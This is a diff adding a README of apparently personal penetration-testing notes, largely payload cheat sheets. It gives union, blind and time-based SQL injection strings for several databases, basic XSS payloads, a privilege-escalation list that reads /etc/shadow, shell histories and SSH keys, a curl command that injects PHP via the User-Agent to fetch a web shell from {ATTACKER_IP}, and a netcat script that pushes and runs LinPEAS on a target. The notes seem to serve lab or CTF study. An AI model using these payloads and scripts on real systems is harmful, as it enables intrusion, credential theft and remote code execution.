@@ -1,0 +1,289 @@
+# KiraSec
+Home of KiraSec MEGA NOTES!!!!
+
+
+
+nobody even knows	2
+
+## About
+ABOUT US!
+
+## Support Us
+support the cause!
+
+## OWASP Top 10
+Section for OWASp top 10 Vulns
+
+
+
+nobody even knows	
+
+### SQLi
+
+SQL Injection (SQLi) Notes
+
+Introduction to SQL Injection
+SQL Injection (SQLi) is a code injection technique used to manipulate or exploit SQL queries by inserting malicious SQL statements. This can lead to unauthorized access to database information, modification of data, and other security breaches.
+
+Key Concepts and Commands
+
+Union-Based SQL Injection
+• Purpose: Used to combine the results from two SELECT queries into a single result set.
+• Syntax: ' UNION SELECT column1, column2 FROM table1 WHERE condition1='value' --+
+• Example: Retrieving information from different tables or columns by leveraging the UNION operator.
+
+
+PostgreSQL Specific Commands
+◇ Retrieve Database Version: ' UNION SELECT version(), NULL--+▪ Retrieves the current version of the PostgreSQL database.
+
+
+◇ List All Table Names: ' UNION SELECT table_name, 'null' FROM information_schema.tables--+▪ Enumerates all table names in the current database schema.
+
+
+◇ List All Column Names: ' UNION SELECT column_name, 'null' FROM information_schema.columns WHERE table_name = 'table_name'--+▪ Enumerates all column names for a specific table in the database.
+
+
+
+
+Blind SQL Injection
+◇ Purpose: Used when the database does not return data to the user or when the results are not visible.
+◇ Example Error Based: TrackingId=xyz' AND SELECT( 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a'--▪ This command checks if the length of the administrator's password is greater than 3.
+
+
+
+
+Oracle Specific Commands
+◇ List Tables and Columns: ' UNION SELECT table_name, column_name FROM all_tables--+▪ Lists all tables and their respective columns in an Oracle database.
+
+
+◇ Blind SQLi Example: TrackingId=xyz'||(SELECT '' FROM dual)||'▪ This is a test to confirm SQL injection by attempting to execute a benign subquery.
+
+
+
+
+Blind SQL Conditional Responses
+◇ Purpose: To deduce information from the database based on the application's response to crafted SQL queries.
+◇ Examples:▪ Test for a valid condition: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+▪ Determine the length of a password: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+
+
+
+
+Methodology for SQL Injection
+1. Identify the Injection Point: Determine where in the application's input fields the SQL injection can occur.
+2. Construct the Injection Query: Start with a simple string and progressively build more complex queries.
+3. Test the Query: Verify that the constructed SQL query executes and manipulates the database output or behavior.
+
+Time-Based SQL Injection
+◇ Purpose: A technique where the response time of the query is used to infer database information.
+◇ Example: '|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --+▪ This query causes the database to delay the response, which can indicate a successful injection.
+
+
+
+By understanding and utilizing these commands and concepts, individuals can identify and prevent SQL injection vulnerabilities in applications, enhancing their security posture.
+
+
+
+
+
+#### CMDs
+SQL Injection Cheat Sheet
+String Concatenation
+• Concatenate multiple strings into a single string.◇ Oracle: 'foo'||'bar'
+◇ Microsoft: 'foo'+'bar'
+◇ PostgreSQL: 'foo'||'bar'
+◇ MySQL: 'foo' 'bar' (Note the space between the strings) or CONCAT('foo','bar')
+
+
+
+Substring
+◇ Extract a substring from a specified offset for a given length.▪ Oracle: SUBSTR('foobar', 4, 2)
+▪ Microsoft: SUBSTRING('foobar', 4, 2)
+▪ PostgreSQL: SUBSTRING('foobar', 4, 2)
+▪ MySQL: SUBSTRING('foobar', 4, 2)
+
+
+
+Comments
+◇ Use comments to truncate a query.▪ Oracle: --comment
+▪ Microsoft: --comment or /*comment*/
+▪ PostgreSQL: --comment or /*comment*/
+▪ MySQL: #comment, -- comment (Note the space after --), or /*comment*/
+
+
+
+Database Version
+◇ Query the database type and version.▪ Oracle: SELECT banner FROM v$version or SELECT version FROM v$instance
+▪ Microsoft: SELECT @@version
+▪ PostgreSQL: SELECT version()
+▪ MySQL: SELECT @@version
+
+
+
+Database Contents
+◇ List the tables and their columns in the database.▪ Oracle: SELECT * FROM all_tables and SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+▪ Microsoft and PostgreSQL: SELECT * FROM information_schema.tables and SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+▪ MySQL: Similar to Microsoft and PostgreSQL.
+
+
+
+Conditional Errors
+◇ Test a boolean condition and trigger a database error if true.▪ Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+▪ Microsoft: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+▪ PostgreSQL: 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+▪ MySQL: SELECT IF(YOUR-CONDITION-HERE, (SELECT table_name FROM information_schema.tables), 'a')
+
+
+
+Time Delays
+◇ Introduce a time delay.▪ Oracle: dbms_pipe.receive_message(('a'),10)
+▪ Microsoft: WAITFOR DELAY '0:0:10'
+▪ PostgreSQL: SELECT pg_sleep(10)
+▪ MySQL: SELECT SLEEP(10)
+
+
+
+Conditional Time Delays
+◇ Trigger a time delay based on a condition.▪ Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+▪ Microsoft: IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+▪ PostgreSQL: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+▪ MySQL: SELECT IF(YOUR-CONDITION-HERE, SLEEP(10), 'a')
+
+
+
+DNS Lookup
+◇ Perform a DNS lookup to an external domain.▪ Specific techniques vary by database system and setup, involving advanced features or external tools like Burp Collaborator.
+
+
+
+DNS Lookup with Data Exfiltration
+◇ Exfiltrate data via DNS lookup.▪ Specific techniques vary, generally involving concatenation of query results with a domain name and triggering a DNS request to an external server.
+
+
+
+Note: For MySQL, batched queries typically cannot be used for SQL injection, but there are exceptions with specific PHP or Python APIs.
+
+
+### XSS
+
+1. Reflected XSS Example
+• Command: <script>alert('XSS');</script>
+• Injection Point: A URL parameter that is reflected back in the webpage without sanitization.
+• Example Scenario: A search function on a website where the search term is reflected in the results page.◇ User visits: https://example.com/search?query=<script>alert('XSS');</script>
+◇ The search results page reflects the query in the HTML response: <p>Your search results for: <script>alert('XSS');</script></p>
+
+
+
+2. Stored XSS Example
+◇ Command: <script>alert('XSS');</script>
+◇ Injection Point: A user input field that stores data in the database and is later displayed on the website without proper encoding.
+◇ Example Scenario: A comment section on a blog post where comments are displayed to all readers.▪ User submits a comment: <script>alert('XSS');</script>
+▪ The comment is stored in the database and displayed to every visitor, executing the script in their browsers.
+
+3. DOM XSS Example
+◇ Command: <img src="invalid-image" onerror="alert('XSS');">
+◇ Injection Point: JavaScript that writes user input directly to the DOM without proper sanitization.
+◇ Example Scenario: A website with a search functionality that dynamically updates the page content based on user input.▪ User enters a search term: <img src="invalid-image" onerror="alert('XSS');">
+▪ The website's JavaScript takes this input and dynamically updates the DOM: document.getElementById('results').innerHTML = 'You searched for: ' + userInput;
+▪ The malicious code is executed when the invalid image fails to load.
+
+
+## Quick Wins
+		Quick Wins
+	Fastest Way Only
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+ps -aux | grep root
+id
+whoami
+sudo -l
+crontab -l
+ls -al /etc/cron*
+cat /etc/crontab
+find / -type f -perm -o=w 2>/dev/null
+find / -type d -perm -o=w 2>/dev/null
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.mysql_history
+ps aux
+dpkg -l  # For Debian/Ubuntu
+rpm -qa  # For CentOS/RHEL
+ifconfig
+ip addr
+netstat -tuln
+ss -tuln
+netstat -tuln
+ss -tuln
+find / -name id_rsa 2>/dev/null
+find / -name "*.conf" 2>/dev/null
+grep -Ri pass /etc 2>/dev/null
+mount
+df -h
+cat /etc/passwd
+cat /etc/shadow 2>/dev/null
+find / -user root -perm -o=r 2>/dev/null
+cat /etc/fstab
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+## Shells
+
+Shells Section: Using Curl for Remote File Creation
+
+REQUIREMENTS:
+1. PHP Support: The target server must be able to execute PHP code.
+2. User-Agent PHP Execution: The server must execute PHP within user agent strings.
+3. Writable Directory: The server directory where shell.php is written must be writable.
+4. Outbound Access: The server needs internet access to fetch the PHP shell from the attacker's server.
+
+Overview
+This section demonstrates how to use curl, a versatile command-line tool, for exploiting web vulnerabilities to deploy a PHP shell on a target machine. The provided commands leverage curl's user agent string manipulation to execute PHP code remotely, leading to the creation of a shell file on the server.
+
+Command 
+bash
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+curl -A “<?php file_put_contents('shell.php', file_get_contents('http://{ATTACKER_IP}/shell.php')); ?>" -s http://{MACHINE_IP}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+
+## Shit Scripts
+
+Auto-transfer and Execute LinPEAS for Privilege Escalation
+This is a bash script to listen for an incoming Netcat connection and automatically transfer and execute LinPEAS on the target machine.
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#!/bin/bash
+# Listener setup on Kali
+nc_listener_port=1234
+linpeas_path="/path/to/linpeas.sh"
+
+# Start listener
+nc -lvnp $nc_listener_port | while read line; do
+  echo "$line" | grep -q 'Connection from' && \
+  {
+    echo "Connection received, transferring linpeas.sh..."
+    # Wait for the shell prompt
+    sleep 1
+    # Transfer linpeas.sh
+    cat $linpeas_path > /dev/tcp/$target/$shell_port
+    echo "linpeas.sh transferred. Running linpeas..."
+    # Command to run linpeas on the target
+    echo "bash linpeas.sh" > /dev/tcp/$target/$shell_port
+  }
+done
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
